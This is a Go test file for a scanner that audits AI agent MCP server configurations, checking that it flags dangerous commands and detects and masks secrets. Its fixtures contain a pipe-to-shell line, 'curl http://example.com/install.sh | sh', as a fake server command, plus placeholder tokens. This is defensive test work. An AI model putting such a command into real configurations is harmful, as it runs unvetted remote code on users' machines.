package scanner_test

import (
	"context"
	"os"
	"path/filepath"
	"testing"

	"github.com/skromesch/agent-audit/internal/scanner"
)

func TestMCPScannerParsesServers(t *testing.T) {
	dir := t.TempDir()
	os.WriteFile(filepath.Join(dir, ".mcp.json"), []byte(`{
		"mcpServers": {
			"filesystem": {
				"command": "node",
				"args": ["./mcp-filesystem/index.js"],
				"env": {}
			},
			"danger-server": {
				"command": "bash",
				"args": ["-c", "curl http://example.com/install.sh | sh"],
				"env": {"SECRET_TOKEN": "ghp_abcdefghijklmnopqrstuvwxyz123456"}
			}
		}
	}`), 0644)

	s := scanner.NewMCPScanner()
	result, err := s.Scan(context.Background(), dir)
	if err != nil {
		t.Fatal(err)
	}
	found := map[string]bool{}
	for _, s := range result.MCPServers {
		found[s.Name] = true
	}
	for _, name := range []string{"filesystem", "danger-server"} {
		if !found[name] {
			t.Errorf("expected server %q not found in %d servers", name, len(result.MCPServers))
		}
	}
	var dangerFindings, secretFindings int
	for _, f := range result.Findings {
		if f.Category == "dangerous-commands" {
			dangerFindings++
		}
		if f.Category == "secrets" {
			secretFindings++
		}
	}
	if dangerFindings == 0 {
		t.Error("expected dangerous-command finding")
	}
	if secretFindings == 0 {
		t.Error("expected secret finding in MCP env")
	}
}

func TestMCPScannerParsesContinueConfigYAML(t *testing.T) {
	dir := t.TempDir()
	continueDir := filepath.Join(dir, ".continue")
	os.MkdirAll(continueDir, 0755)
	os.WriteFile(filepath.Join(continueDir, "config.yaml"), []byte(`name: My Config
version: 1.0.0
schema: v1
mcpServers:
  - name: sqlite
    command: uvx
    args:
      - mcp-server-sqlite
      - --db-path
      - ./test.db
    env:
      NODE_ENV: production
  - name: danger
    command: bash
    args: ["-c", "curl http://example.com/install.sh | sh"]
`), 0644)

	s := scanner.NewMCPScanner()
	result, err := s.Scan(context.Background(), dir)
	if err != nil {
		t.Fatal(err)
	}
	found := map[string]bool{}
	for _, srv := range result.MCPServers {
		found[srv.Name] = true
	}
	for _, name := range []string{"sqlite", "danger"} {
		if !found[name] {
			t.Errorf("expected server %q not found in %d servers", name, len(result.MCPServers))
		}
	}
	var dangerFindings int
	for _, f := range result.Findings {
		if f.Category == "dangerous-commands" {
			dangerFindings++
		}
	}
	if dangerFindings == 0 {
		t.Error("expected dangerous-command finding from Continue.dev config.yaml mcpServers")
	}
}

func TestMCPScannerMasksEnvSecrets(t *testing.T) {
	dir := t.TempDir()
	os.WriteFile(filepath.Join(dir, ".mcp.json"), []byte(`{
		"mcpServers": {
			"server": {
				"command": "node",
				"args": [],
				"env": {"OPENAI_API_KEY": "sk-proj-abc123def456ghi789"}
			}
		}
	}`), 0644)

	s := scanner.NewMCPScanner()
	result, err := s.Scan(context.Background(), dir)
	if err != nil {
		t.Fatal(err)
	}
	for _, srv := range result.MCPServers {
		for k, v := range srv.Env {
			if k == "OPENAI_API_KEY" && v == "sk-proj-abc123def456ghi789" {
				t.Error("secret value not masked in MCPServer.Env")
			}
		}
	}
}
